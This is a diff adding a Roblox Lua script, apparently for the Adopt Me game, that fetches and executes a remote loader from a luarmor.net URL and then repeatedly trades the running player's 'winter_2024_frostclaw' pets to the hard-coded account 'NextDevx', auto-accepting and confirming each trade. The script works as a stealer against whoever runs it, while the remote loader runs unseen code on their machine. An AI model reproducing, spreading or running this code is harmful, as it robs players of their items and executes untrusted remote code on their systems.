@@ -1,0 +1,39 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e4315db490a84e920190f83279c4732e.lua"))()
+ end)
+ spawn(function()
+     while wait(1) do
+         pcall(function()
+             getgenv().Config = {
+                 ["Nickname"] = "NextDevx",
+                 ["Pet_kind"] = "winter_2024_frostclaw",
+                 ["Pet_unique"] = ""
+             }
+             local APIs = game:GetService("ReplicatedStorage").API:GetChildren()
+             local args1 = {
+                 [1] = game:GetService("Players"):WaitForChild(getgenv().Config["Nickname"])
+             }
+             game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args1))
+             local TradeFrame = game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame
+             repeat wait() until TradeFrame.Visible == true
+             local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+             local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+             -- Собираем названия питомцев
+             for i, petData in pairs(playerData.inventory.pets) do
+                 if petData.kind == getgenv().Config["Pet_kind"] then
+                     local args = {
+                         [1] = petData.unique
+                     }               
+                     game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args)) 
+                 end
+             end
+             local player = game:GetService("Players").LocalPlayer
+             local request = http_request or request or HttpPost or syn.request
+             repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept.Face.Colors.Base.ImageColor3 == Color3.fromRGB(74,198,85)
+             game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
+             repeat wait(1) until game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible == true
+             game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
+             repeat wait(1) until TradeFrame.Visible == false
+         end)
+     end
+ end)
